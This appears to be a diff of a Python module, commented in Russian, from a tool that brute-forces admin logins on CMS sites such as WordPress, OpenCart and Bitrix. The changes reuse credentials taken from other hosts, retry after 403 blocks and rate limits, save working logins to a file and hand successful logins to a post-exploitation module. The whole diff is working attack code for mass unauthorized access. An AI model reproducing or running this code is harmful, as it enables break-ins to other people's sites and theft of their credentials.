@@ -1,4 +1,4 @@
-# -*- coding: utf-8 -*-
+﻿# -*- coding: utf-8 -*-
 """Перебор входа в админку. Движок не важен: форма разбирается со страницы.
 
 run() возвращает:
@@ -11,8 +11,8 @@ import random
 import re
 import time
 
-from core import config, http, learn, ui, users
-from modules import profiles
+from core import config, http, learn, ui, users, vault, verify
+from modules import post, profiles
 
 CAP = 6            # попыток на хост по умолчанию
 DEFAULTS = (("admin", "admin"), ("admin", "123456"), ("admin", "admin123"),
@@ -210,31 +210,19 @@ def _post(host, form, user, pwd, sess):
     return http.post(host, form["action"], body, referer=ref, sess=sess, timeout=8, tries=1)
 
 
-def _verify(host, sess, kind):
-    try:
-        prof = profiles.get(kind) or {}
-        for a in (prof.get("admin") or [])[:3]:
-            r = http.get(host, a, sess=sess)
-            low = r.text.lower()
-            if r.status_code == 200 and "password" not in low and ("logout" in low or "dashboard" in low):
-                return True
-    except Exception:
-        pass
-    return False
-
-
 def _ok(host, r, sess, kind):
     loc = (r.headers.get("Location") or "").lower()
     if kind == "opencart" and "user_token=" in loc:
         return True
-    if loc and "login" not in loc and "wp-login" not in loc:
-        if _verify(host, sess, kind):
-            return True
-    body = r.text.lower()
+    body = (r.text or "").lower()
     if kind == "frappe" and ('"logged in"' in body or '"home_page"' in body):
         return True
+    if "reauth=1" in loc:
+        return False
+    if loc and "login" not in loc and "wp-login" not in loc:
+        return verify.confirm(host, sess, kind)
     if "logout" in body and 'name="password"' not in body:
-        return True
+        return verify.confirm(host, sess, kind)
     return False
 
 
@@ -269,7 +257,7 @@ def run(host, title="", quiet=False, kind="", budget=CAP, pause=PAUSE, login="")
 
     words = learn.bonus(kind, _words(host, title))
     users = _users(host, kind)
-    pairs = []
+    pairs = list(vault.pairs(kind, exclude=host, limit=10))
     for u, p in DEFAULTS:
         pairs.append((u, p))
     if kind == "bitrix":
@@ -302,10 +290,20 @@ def run(host, title="", quiet=False, kind="", budget=CAP, pause=PAUSE, login="")
                 return ("blocked",)
             time.sleep(1.5)
             continue
+        if r.status_code == 403:
+            time.sleep(2.5)
+            try:
+                r = _post(host, form, user, pwd, sess)
+            except Exception:
+                pass
         if _ok(host, r, sess, kind):
             if not quiet:
                 ui.ok("ПОДОШЛО: %s / %s" % (user, pwd))
             learn.password_ok(kind, pwd)
+            vault.add(host, kind, user, pwd)
+            _append(OK_FILE, "%s|%s|%s:%s" % (host, kind, user, pwd))
+            if not quiet:
+                post.run(host, kind, "%s:%s" % (user, pwd))
             return ("ok", user, pwd)
         if _limited(r):
             if not quiet:
@@ -358,3 +356,19 @@ def run_batch(items, workers=8, budget=CAP):
             if state == "ok":
                 ui.ok("%s — ВХОД" % host)
     return stats
+
+
+def resume(budget=CAP, workers=4):
+    """Повтор отложенных: капча, лимит, блок."""
+    if not os.path.isfile(PARK_FILE):
+        return collections.Counter()
+    items = []
+    with open(PARK_FILE, encoding="utf-8") as f:
+        for line in f:
+            p = line.strip().split("|")
+            if len(p) >= 4 and p[3]:
+                items.append((p[0], p[1], p[3]))
+    if not items:
+        return collections.Counter()
+    open(PARK_FILE, "w", encoding="utf-8").close()
+    return run_batch(items, workers=workers, budget=budget)
